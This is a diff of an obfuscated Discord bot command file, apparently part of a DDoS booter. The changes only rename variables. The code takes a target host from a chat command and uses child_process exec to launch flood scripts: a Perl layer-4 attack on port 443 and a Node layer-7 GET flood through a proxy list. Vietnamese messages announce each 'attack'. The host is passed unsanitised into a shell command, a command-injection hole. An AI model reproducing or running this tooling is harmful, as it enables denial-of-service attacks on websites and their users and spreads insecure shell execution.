@@ -39,11 +39,11 @@ module['exports'] = {
             })
         };
         const _0xf396x9 = _0xf396x8['options']['getString']('methods');
-        const _website = _0xf396x8['options']['getString']('host');
+        const website = _0xf396x8['options']['getString']('host');
         if (_0xf396x9 === 'god') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`perl vip/L4/${_method}.pl ${_website} 443 65500 60`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`perl vip/L4/${method}.pl ${website} 443 65500 60`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -51,7 +51,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
@@ -83,9 +83,9 @@ module['exports'] = {
             })
         }
         if (_0xf396x9 === 'MASTER-LOAD') {
-            var _method = _0xf396x9;
+            var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node vip/L7/'}${_method}${'.js GET '}${_website}${' http.txt 60 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'node vip/L7/'}${method}${'.js GET '}${website}${' http.txt 60 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -93,7 +93,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🔗 Host:`**',
-                value: `${' [ '}${_website}${' ] '}`,
+                value: `${' [ '}${website}${' ] '}`,
                 inline: true
             }, {
                 name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
